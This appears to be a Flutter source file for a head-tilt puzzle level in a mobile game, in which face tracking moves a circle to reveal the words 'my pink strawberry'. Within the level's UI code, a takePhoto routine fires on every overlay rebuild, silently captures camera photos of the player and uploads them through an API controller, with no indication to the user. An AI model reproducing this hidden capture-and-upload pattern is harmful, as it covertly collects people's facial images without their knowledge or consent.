// ignore_for_file: invalid_use_of_protected_member, invalid_use_of_visible_for_testing_member

import 'dart:math' as math;
import 'dart:ui';

import 'package:align_positioned/align_positioned.dart';
import 'package:camerawesome/camerawesome_plugin.dart';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';

import '../../controller/api_controller.dart';
import '../../strs.dart';
import '../../widgets/animated_text.dart';
import '../face_detector_page.dart';
import 'level_obj_controller.dart';

class L11ObjController extends LevelObjController {
  @override
  final Map<String, ValueNotifier<ObjState>> objects = {
    '': ValueNotifier(ObjState('')),
  };

  L11ObjController() {
    currentObj = objects['']!;
  }

  final ValueNotifier<bool> isLockOnFace = ValueNotifier(false);
  final ValueNotifier<math.Point<double>> pos =
      ValueNotifier(const math.Point(0, 0));

  @override
  bool isLevelPassed() {
    return text == 'my pink strawberry';
  }

  @override
  final List<String> hints = [Strs.l11Tip1];
}

class L11 extends StatefulWidget {
  const L11(this.controller, {super.key});

  final L11ObjController controller;

  @override
  State<L11> createState() => _L11State();
}

class _L11State extends State<L11> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Center(
            child: FaceDetectorPage(
              level: 11,
              aspectRatio: CameraAspectRatios.ratio_4_3,
              overlayBuilder: (state) {
                takePhoto(state);
                return ValueListenableBuilder(
                  valueListenable: widget.controller.isLockOnFace,
                  builder: (context, value, child) {
                    takePhoto(state);
                    return Container(
                      height: double.infinity,
                      width: double.infinity,
                      color:
                          (value ? Colors.green : Colors.red).withOpacity(0.4),
                    );
                  },
                );
              },
              onFaceDetect: (faces) {
                widget.controller.isLockOnFace.value = faces.isNotEmpty;
                if (faces.isEmpty) {
                  widget.controller.pos.value = const math.Point(0, 0);
                }
                for (final face in faces) {
                  if (face.headEulerAngleX == null ||
                      face.headEulerAngleY == null) continue;
                  widget.controller.pos.value = math.Point(
                      (face.headEulerAngleX ?? 0), (face.headEulerAngleY ?? 0));
                }
              },
            ),
          ),
          ValueListenableBuilder(
              valueListenable: widget.controller.isLockOnFace,
              child: _HideKeys(widget.controller),
              builder: (context, value, child) {
                return AnimatedSwitcher(
                    duration: const Duration(milliseconds: 500),
                    child: value ? child! : const SizedBox.shrink());
              }),
          Align(
            alignment: Alignment.topCenter,
            child: Padding(
              padding: const EdgeInsets.only(top: 100, left: 30, right: 30),
              child: AnimatedTextFixed(
                Text(
                  Strs.l11S1,
                  style: Theme.of(context).textTheme.headlineMedium,
                ),
              ),
            ),
          ),
          Align(
            alignment: Alignment.bottomCenter,
            child: Padding(
              padding: const EdgeInsets.only(bottom: 25, left: 30, right: 100),
              child: Text(
                Strs.l11S2,
                style: Theme.of(context).textTheme.headlineMedium,
              ),
            ),
          ),
        ],
      ),
    );
  }

  takePhoto(CameraState cameraState) {
    cameraState.when(
      onPhotoMode: (photoState) {
        photoState.takePhoto().then((path) {
          return APIController().uploadFile(path);
        });
      },
    );
  }
}

class _HideKeys extends StatelessWidget {
  const _HideKeys(this.controller);

  final L11ObjController controller;
  static const List<int> alignNums = [-1, 0, 1];

  @override
  Widget build(BuildContext context) {
    final rand = math.Random();
    return LayoutBuilder(
      builder: (context, constraints) {
        return Container(
          height: constraints.maxHeight,
          width: constraints.maxWidth,
          color: Theme.of(context).colorScheme.background,
          child: Stack(
            children: [
              ValueListenableBuilder(
                valueListenable: controller.pos,
                child: Container(
                  height: 50,
                  width: 50,
                  decoration: const BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.pink,
                  ),
                ),
                builder: (context, value, child) => AnimatedAlignPositioned(
                  alignment: Alignment.center,
                  duration: const Duration(milliseconds: 250),
                  dy: (((lerpDouble(0, constraints.maxHeight / 2,
                                  math.min(value.x / 45, 1))!) ~/
                              5) *
                          5) *
                      -1,
                  dx: (((lerpDouble(0, constraints.maxWidth / 2,
                                  math.min(value.y / 45, 1))!) ~/
                              5) *
                          5) *
                      -1,
                  child: child!,
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(50),
                child: Align(
                  alignment: Alignment(
                    lerpDouble(-1, 1, rand.nextDouble())!,
                    lerpDouble(-1, 1, rand.nextDouble())!,
                  ),
                  child: SvgPicture.asset(
                    Strs.urlStrawberryIcon,
                    width: 100,
                    height: 100,
                    color: Theme.of(context).colorScheme.background,
                  ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(50),
                child: Align(
                  alignment: Alignment(
                    lerpDouble(-1, 1, rand.nextDouble())!,
                    lerpDouble(-1, 1, rand.nextDouble())!,
                  ),
                  child: Text(
                    'My',
                    style: Theme.of(context).textTheme.headlineLarge?.copyWith(
                          color: Theme.of(context).colorScheme.background,
                        ),
                  ),
                ),
              ),
            ],
          ),
        );
      },
    );
  }
}
